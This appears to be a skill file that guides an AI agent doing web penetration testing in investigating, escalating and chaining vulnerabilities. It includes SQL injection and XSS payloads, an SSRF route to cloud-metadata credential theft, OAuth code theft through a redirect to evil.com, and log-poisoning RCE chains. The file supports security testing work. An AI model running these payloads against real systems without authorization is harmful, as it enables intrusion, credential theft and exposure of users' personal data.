---
name: investigate
description: Deep investigation of anomalies — determine exploitability, chain findings, escalate impact
---

# Investigate Anomaly

You found something suspicious — a score of 35 from auto_probe, a 500 error on injection, a subtle length difference. Your job is to determine: is this exploitable, and how bad is it?

## When to Use This Skill

- `auto_probe` returned findings with score < 50 (suspicious but not confirmed)
- `fuzz_parameter` showed anomalies (status change, length diff, timing spike)
- Manual testing revealed unexpected behavior
- You need to escalate a LOW/MEDIUM finding to demonstrate real impact
- You want to chain multiple findings together

## Phase 1: Understand the Behavior

Before crafting any payload, understand WHAT the application does with your input.

### Step 1: Establish baseline behavior

```python
# Send the NORMAL request, record everything
session_request(session, "GET", path, extract={...})
# Note: exact status, exact length, exact timing, key response content
```

### Step 2: Probe the input handling

Send these diagnostic inputs and compare against baseline:

| Input | What it tells you |
|---|---|
| Empty string `""` | Does the app require the parameter? |
| Very long string (5000 chars) | Buffer handling, truncation behavior |
| Special chars `'"\<>{}()` | Which chars are filtered/encoded/reflected? |
| Unicode `%C0%AE` `%EF%BC%8F` | Does the app normalize unicode? |
| Null byte `%00` | Does it truncate at null? |
| Numeric boundaries `0`, `-1`, `999999999` | Integer handling, IDOR potential |
| Type confusion `[]`, `{}`, `true` | JSON parsing behavior |

### Step 3: Map the reflection context

If input appears in the response, determine WHERE:

```python
# Send a unique marker and find it in the response
session_request(session, "GET", f"{path}?{param}=XYZZY123PROBE")
# Then get_request_detail with full_body=True and search for XYZZY123PROBE
```

**Context determines everything:**
- Inside HTML body → test HTML injection (`<img>`, `<svg>`)
- Inside HTML attribute → test attribute breakout (`" onmouseover=`)
- Inside JavaScript string → test string breakout (`'-alert(1)-'`)
- Inside JavaScript template literal → test `${expression}`
- Inside URL/href → test `javascript:` protocol
- Inside JSON response → test JSON injection
- Inside HTTP header → test CRLF injection
- Not reflected → try blind techniques (timing, Collaborator)

### Step 4: Map the filter

If special characters are filtered, determine the filter precisely:

```python
# Test each character individually
fuzz_parameter(index, parameter="param", payloads=[
    "<", ">", "'", '"', "/", "\\", "{", "}", "(", ")", ";", "|", "&",
    "%3C", "%3E", "%27", "%22",  # URL-encoded versions
    "&#60;", "&#62;",             # HTML entity versions
], grep_match=["<", ">", "'", '"', "{", "}"])
```

Build a filter map:
- `<` blocked, `%3C` blocked, `&#60;` allowed → HTML entity bypass possible
- `<script>` blocked, `<img>` allowed → tag-based bypass
- `alert` blocked, `confirm` allowed → function name bypass
- Single quotes blocked, backticks allowed → template literal injection

## Phase 2: Deepen the Investigation

Based on what Phase 1 revealed, choose the appropriate deep-dive:

### If input is reflected (potential XSS/injection)

1. **Determine exact context** using the reflection check above
2. **Try context-appropriate breakouts:**
   ```python
   get_payloads(category="xss", context="attribute")  # If in attribute
   get_payloads(category="xss", context="javascript")  # If in JS string
   get_payloads(category="xss", context="waf_bypass")  # If WAF detected
   ```
3. **Test with encoding variations:**
   ```python
   decode_encode(payload, "url_encode")
   decode_encode(payload, "double_url_encode")
   decode_encode(payload, "html_encode")
   ```
4. **Fuzz with the targeted payloads:**
   ```python
   fuzz_parameter(index, parameter=param, payloads=targeted_list,
                  grep_match=["alert", "onerror", "onload"])
   ```

### If status code changed (potential SQLi/CMDi/LFI)

1. **Determine if it's injection or just input validation:**
   ```python
   # Compare error responses — do they differ by payload?
   resend_with_modification(index, modify_path=f"{path}?{param}='")      # Single quote
   resend_with_modification(index, modify_path=f"{path}?{param}=''")     # Double quote (valid SQL)
   resend_with_modification(index, modify_path=f"{path}?{param}=1 AND 1=1")  # True condition
   resend_with_modification(index, modify_path=f"{path}?{param}=1 AND 1=2")  # False condition
   ```
2. **If true vs false differ: it's boolean-blind SQLi** — extract data with binary search
3. **If both error: test timing:**
   ```python
   # Time-based blind confirmation
   probe_endpoint(session, method, path, param,
                  test_payloads=["1; WAITFOR DELAY '0:0:3'--", "1 AND SLEEP(3)--", "1; SELECT pg_sleep(3)--"])
   ```
4. **If timing confirms: use Collaborator for OOB confirmation:**
   ```python
   auto_collaborator_test(index, param)
   ```

### If length changed significantly (potential IDOR/data leak)

1. **Compare the actual content:**
   ```python
   compare_responses(baseline_index, anomaly_index, mode="body")
   ```
2. **Look for PII or different user data** in the diff
3. **Test with multiple IDs systematically:**
   ```python
   fuzz_parameter(index, parameter="id", payloads=["1","2","3","0","-1","999"],
                  grep_match=["email", "phone", "address", "password", "ssn"])
   ```
4. **Cross-auth verification:**
   ```python
   compare_auth_states(index, alt_cookies={"session": "other_user_cookie"})
   ```

### If timing anomaly (potential blind injection)

1. **Rule out network jitter — test 3 times each:**
   ```python
   # Baseline timing (3 requests)
   session_request(session, method, f"{path}?{param}=1")  # Note time
   session_request(session, method, f"{path}?{param}=1")  # Note time
   session_request(session, method, f"{path}?{param}=1")  # Note time

   # Payload timing (3 requests)
   session_request(session, method, f"{path}?{param}=1 AND SLEEP(3)--")  # Note time
   session_request(session, method, f"{path}?{param}=1 AND SLEEP(3)--")  # Note time
   session_request(session, method, f"{path}?{param}=1 AND SLEEP(3)--")  # Note time
   ```
2. **Consistent 3x+ delay = confirmed blind injection**
3. **Try different sleep values** (SLEEP(1), SLEEP(5)) — delay should scale linearly

## Phase 3: Escalate Impact

A finding is worth more when you demonstrate real-world impact. Escalate:

### From error-based SQLi → data extraction
```python
# Extract database version
probe_endpoint(session, method, path, param,
               test_payloads=["1 AND 1=CONVERT(int,@@version)--",
                              "1 AND ExtractValue(1,CONCAT(0x7e,version()))--"])
# Extract table names
# Extract user credentials
```

### From reflected XSS → session hijacking proof
```python
# Craft a payload that demonstrates cookie theft
# Show that document.cookie is accessible (no HttpOnly)
# Or demonstrate CSP bypass if CSP exists
```

### From SSRF → credential theft
```python
test_cloud_metadata(session, parameter=param, path=path)
# If AWS: try /latest/meta-data/iam/security-credentials/
# If internal access: try hitting internal services (Redis, Elasticsearch)
```

### From IDOR → mass data exposure
```python
# Don't just show one ID works — show the PATTERN
test_auth_matrix(
    endpoints=[
        {"method": "GET", "path": "/api/users/1/profile"},
        {"method": "GET", "path": "/api/users/2/profile"},
        {"method": "GET", "path": "/api/users/3/profile"},
    ],
    auth_states={"victim": {"session": "attacker_session"}}
)
# Quantify: "Attacker can access all N user profiles"
```

### From open redirect → OAuth token theft
```python
# If redirect param is in OAuth flow:
# redirect_uri=https://evil.com → steal authorization code
# This elevates from MEDIUM open redirect to HIGH account takeover
```

## Phase 4: Chain Findings

The highest-value bugs are CHAINS. Look for these patterns:

| Finding A | + Finding B | = Impact |
|---|---|---|
| Open redirect | SSRF with URL validation bypass | Access internal services via redirect chain |
| XSS (any) | CSRF on sensitive action | Wormable attack — XSS triggers CSRF automatically |
| Info disclosure (internal URL) | SSRF | Access internal service using leaked URL |
| IDOR (read) | CSRF | Read victim's data then modify it |
| LFI | Log poisoning (User-Agent injection) | LFI → read access log → RCE via injected PHP in logs |
| JWT weak secret | Claim modification | Forge admin JWT → full account takeover |
| XSS | Cookie without HttpOnly | Session hijacking via document.cookie exfiltration |
| CORS misconfiguration | Sensitive API endpoint | Cross-origin data theft of user PII |

### How to chain
```python
# Step 1: Verify Finding A works
# Step 2: Verify Finding B works independently
# Step 3: Build the chain using run_flow:
run_flow(session, steps=[
    {"method": "GET", "path": "/redirect?url=http://internal.service",  # Finding A: redirect
     "extract": {"internal_data": {"from": "body", "regex": "secret=([^&]+)"}}},
    {"method": "POST", "path": "/api/action",  # Finding B: use leaked data
     "json_body": {"secret": "{{internal_data}}"}},
])
```

## Phase 5: Document the Finding

Once exploitation is confirmed, save with full context:

```python
save_target_intel(domain, "findings", {
    "endpoint": "GET /api/users",
    "vulnerability_type": "sqli",
    "parameter": "id",
    "status": "confirmed",
    "severity": "HIGH",
    "evidence": {
        "baseline": {"status": 200, "length": 1234, "time_ms": 120},
        "payload": "1' AND SLEEP(3)--",
        "result": {"status": 200, "length": 1234, "time_ms": 3250},
        "reproduction_rate": "3/3 attempts",
        "collaborator_proof": "DNS interaction from 10.0.0.1"
    },
    "poc_request": {"method": "GET", "path": "/api/users?id=1' AND SLEEP(3)--"},
    "impact": "Time-based blind SQL injection allows full database extraction including user credentials",
    "chain_potential": "Can be chained with IDOR on /api/users/{id} for targeted data extraction",
    "last_verified": "<timestamp>",
    "verification_failures": 0
})
```

## Decision Rules

- **Score >= 50 from auto_probe**: Likely real — do a quick verify (Phase 1 Step 1-2 only) then confirm
- **Score 30-49**: Suspicious — run full Phase 1-2 investigation
- **Score 10-29**: Probably noise — spend max 5 tool calls investigating, then move on
- **Score < 10**: Skip — not worth investigating unless you have a specific hypothesis
- **Any Collaborator interaction**: Always real — document immediately
- **Timing > 3x baseline (3+ measurements)**: Very likely real — document and escalate
